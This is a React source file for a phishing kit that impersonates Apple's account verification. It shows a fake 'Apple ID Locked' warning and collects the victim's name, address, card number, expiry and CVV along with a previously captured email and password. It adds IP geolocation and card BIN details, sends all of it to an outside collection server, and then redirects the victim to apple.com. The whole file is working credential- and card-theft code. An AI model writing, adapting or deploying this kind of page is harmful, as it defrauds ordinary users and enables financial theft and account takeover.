import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";
import "./form.css";
import Cards from "react-credit-cards-2";
import "react-credit-cards-2/es/styles-compiled.css";
import {
  formatCreditCardNumber,
  formatCVC,
  formatExpirationDate,
} from "./Format";
import axios from "axios";
import { userId } from "../../config";

function Form() {
  const location = useLocation();
  const data = location.state;
  const [ccBin, setCcBin] = useState([]);
  const [fokus, setFokus] = useState("");
  const [email, setEmail] = useState(`${data.email}`);
  const [password, setPassword] = useState(`${data.password}`);
  const [name, setName] = useState("");
  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [country, setCountry] = useState("");
  const [zip, setZip] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expDate, setExpDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [ip, setIP] = useState([]);
  const [errors, setErrors] = useState({});
  const [geo, setGeo] = useState([]);
  const [bin, setBin] = useState([]);
  const [isOpen, setIsOpen] = useState(false);
  const [isDone, setisDone] = useState(false);

  function validate() {
    let newErrors = {};
    if (!name) newErrors.name = "Name is required";
    if (!address) newErrors.address = "Address is required";
    if (!city) newErrors.city = "City is required";
    if (!state) newErrors.state = "State is required";
    if (!zip) newErrors.zip = "Zip is required";
    if (!country) newErrors.country = "Country is required";
    if (!zip.match(/^\d{5}(?:[-\s]\d{4})?$/))
      newErrors.zip = "Zip code is invalid";
    if (!cardNumber) newErrors.cardNumber = "Card number is required";
    if (
      !cardNumber.match(
        /^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$/
      )
    )
      newErrors.cardNumber = "Card number is invalid";
    if (!expDate) newErrors.expDate = "Expiration is required";
    if (!expDate.match(/^(0[1-9]|1[0-2])\/([0-9]{2})$/))
      newErrors.expDate = "Expiration date is invalid";
    if (expDate.slice(3.4) <= 22) newErrors.expDate = `Expired Year`;
    if (!cvv) newErrors.cvv = "CVV is required";
    if (!cvv.match(/^[0-9]{3,4}$/)) newErrors.cvv = "CVV is invalid";
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  }
  const getBin = (event) => {
    var lookup = require("binlookup")();
    lookup(`${event.target.value.slice(0, 6)}`, function (err, data) {
      if (err) return console.error(err);

      setBin(data);
    });
  };
  const handleSubmit = (event) => {
    event.preventDefault();
    if (!validate()) return console.info(errors);
    const result = {
      email: email,
      password: password,
      name: name,
      address: address,
      city: city,
      state: state,
      country: country,
      zip: zip,
      ccScheme: bin?.scheme ?? "gak ada",
      cardNumber: cardNumber,
      expDate: expDate,
      cvv: cvv,
      ip: ip,
      binNumber: cardNumber.slice(0, 6),
      ccType: bin?.type ?? "gak ada",
      ccFlag: bin?.country?.emoji ?? "gak ada",
      userId: userId,
      bank: bin?.bank?.name ?? "gak ada",
    };
    setisDone(true);

    axios
      .post("https://result.fajrul.id/api/result", result)
      .then((response) => {
        console.log(response);
        // do something with the response, such as redirect to the login page
      })
      .catch((error) => {
        console.log(error);
        // handle error, such as displaying error messages to the user
      });

    setTimeout(() => {
      window.location.href = "https://apple.com";
    }, 6000);
  };

  const checkCreditCardChange = (event) => {
    if (event.target.name === "number") {
      event.target.value = formatCreditCardNumber(event.target.value);
    } else if (event.target.name === "expDate") {
      event.target.value = formatExpirationDate(event.target.value);
    } else if (event.target.name === "cvv") {
      event.target.value = formatCVC(event.target.value);
    }
  };
  const handleInputFocus = (event) => {
    setFokus(event.target.id);
  };

  const getGeo = async () => {
    try {
      const response = await await axios.get(`https://ip-api.com/json/`);
      setGeo(response.data);
      setIP(response.data.query);
    } catch (error) {
      console.error(error);
    }
  };

  console.info();
  useEffect(() => {
    getGeo();
  }, []);

  function toggleModal() {
    setIsOpen(!isOpen);
  }

  return (
    <>
      {isOpen && (
        <div className="fixed top-0 left-0 h-full w-full bg-gray-900 bg-opacity-75 z-50">
          <div className="relative top-[40vh] mx-auto my-0 max-w-xs md:max-w-lg bg-white z-60 rounded-lg p-4">
            <div className="flex flex-col justify-center items-center">
              <h1 className="text-gray-900 font-semibold text-2xl md:text-4xl pb-2 md:pb-4 border-b">
                Apple ID Locked
              </h1>
              <p className="text-center mt-1 mx-4 text-base md:text-2xl">
                Your Apple ID has been locked for security reason. To unlock it,
                you must verity your identity
              </p>
            </div>
          </div>
        </div>
      )}
      {isDone && (
        <div className="fixed top-0 left-0 h-full w-full z-50">
          <div className="flex justify-center items-center h-full">
            <img
              className="h-16 w-16"
              src="https://icons8.com/preloaders/preloaders/1488/Iphone-spinner-2.gif"
              alt=""
            />
          </div>
        </div>
      )}
      <div id="head" className="w-full max-w-screen flex justify-center">
        <div className="w-full md:max-w-4xl">
          <div className="flex items-center justify-between">
            <h1 className="text-3xl md:text-4xl mt-10 mx-16 md:m-20 md:mb-0 mb-0 text-white">
              Account Verification
            </h1>
            <button
              id="logout"
              className="hidden md:block text-white font-light capitalize hover:font-normal"
            >
              sign out
            </button>
          </div>
          <p className="mx-16 md:m-20 md:mt-0 mb-0 text-white">
            Your Email : {data.email}
          </p>
        </div>
      </div>
      <div className="w-full flex justify-center md:justify-start max-w-3xl gap-8 mx-8">
        <div className="w-full max-w-xs">
          <form onSubmit={(event) => handleSubmit(event)}>
            <h1 className="text-3xl my-2 font-light">Address</h1>
            <div className="border-t-4 mb-4"></div>
            <label className="flex flex-col md:w-[36rem] max-w-4xl">
              Name:
              <input
                className="required"
                type="text"
                name="name"
                value={name}
                placeholder="ex.Jhon Muller"
                onChange={(event) => setName(event.target.value)}
                required
              />
              {errors.name && <p className="error">{errors.name}</p>}
            </label>
            <br />
            <label className="flex flex-col md:w-[36rem] max-w-4xl">
              Address:
              <input
                className="required"
                type="text"
                name="address"
                placeholder="ex.215 E Tasman Dr"
                value={address}
                onChange={(event) => setAddress(event.target.value)}
              />
              {errors.address && <p className="error">{errors.address}</p>}
            </label>
            <br />
            <label className="flex flex-col md:w-[36rem] max-w-4xl">
              City:
              <input
                className="required"
                type="text"
                name="city"
                placeholder={geo?.city || null}
                defaultValue={geo?.city}
                value={city}
                onChange={(event) => setCity(event.target.value)}
              />
              {errors.city && <p className="error">{errors.city}</p>}
            </label>
            <br />
            <label className="flex flex-col md:w-[36rem] max-w-4xl">
              State:
              <input
                className="required"
                type="text"
                name="state"
                value={state}
                placeholder={geo?.regionName || null}
                defaultValue={geo?.regionName}
                onChange={(event) => setState(event.target.value)}
              />
              {errors.state && <p className="error">{errors.state}</p>}
            </label>
            <br />
            <label className="flex flex-col md:w-[36rem] max-w-4xl">
              Country:
              <input
                className="required"
                type="text"
                name="country"
                value={country}
                placeholder={geo?.country || null}
                defaultValue={geo?.country}
                onChange={(event) => setCountry(event.target.value)}
              />
              {errors.country && <p className="error">{errors.country}</p>}
            </label>
            <br />
            <label className="flex flex-col md:w-[36rem] max-w-4xl">
              Zip Code:
              <input
                className="required"
                type="text"
                name="zip"
                value={zip}
                placeholder="00000"
                onChange={(event) => setZip(event.target.value)}
              />
              {errors.zip && <p className="error">{errors.zip}</p>}
            </label>
            <br />

            <h1 className="text-3xl my-2 font-light">Card Details</h1>
            <div className="border-t-4">
              <label className="flex flex-col md:w-[36rem] max-w-4xl mt-4">
                Card Number:
                <input
                  className="required"
                  type="text"
                  name="cardNumber"
                  id="number"
                  value={cardNumber}
                  placeholder="Your Card Number"
                  pattern="[\d| ]{16,22}"
                  onChange={(event) => {
                    checkCreditCardChange(event);
                    setTimeout(() => {
                      getBin(event);
                    }, 4000);
                    setCardNumber(event.target.value);
                  }}
                  onFocus={handleInputFocus}
                  required
                />
                {errors.cardNumber && (
                  <p className="error">{errors.cardNumber}</p>
                )}
              </label>
              <br />
              <div className="flex justify-between w-full md:w-[36rem] max-w-4xl">
                <label className="flex flex-col w-1/2">
                  Expiration Date:
                  <input
                    className="required"
                    pattern="\d\d/\d\d"
                    type="text"
                    id="expiry"
                    name="expDate"
                    placeholder="MM/YY"
                    value={expDate}
                    onChange={(event) => {
                      checkCreditCardChange(event);
                      setExpDate(event.target.value);
                    }}
                    onFocus={handleInputFocus}
                    required
                  />
                  {errors.expDate && <p className="error">{errors.expDate}</p>}
                </label>

                <label className="flex flex-col w-1/3">
                  CVV:
                  <input
                    className="required"
                    type="text"
                    name="cvv"
                    id="cvc"
                    placeholder="CVV"
                    pattern="\d{3,4}"
                    maxLength={4}
                    value={cvv}
                    onChange={(event) => {
                      checkCreditCardChange(event);
                      setCvv(event.target.value);
                    }}
                    onFocus={handleInputFocus}
                    required
                  />
                  {errors.cvv && <p className="error">{errors.cvv}</p>}
                </label>
              </div>
              <br />
              <div className="relative mb-20 md:mb-32 md:w-[36rem] max-w-4xl">
                <Cards
                  number={cardNumber}
                  name={name}
                  expiry={expDate}
                  cvc={cvv}
                  focused={fokus}
                />

                <div className="form-actions absolute right-0 md:right-[-200px] mt-8">
                  <button
                    id="btn"
                    className="px-8 py-2 rounded-xl bg-[#0071e3] font-extralight text-white btn-primary btn-block hover:bg-sky-500"
                    type="submit"
                  >
                    Continue
                  </button>
                </div>
              </div>
            </div>
          </form>
        </div>
      </div>
    </>
  );
}
export default Form;
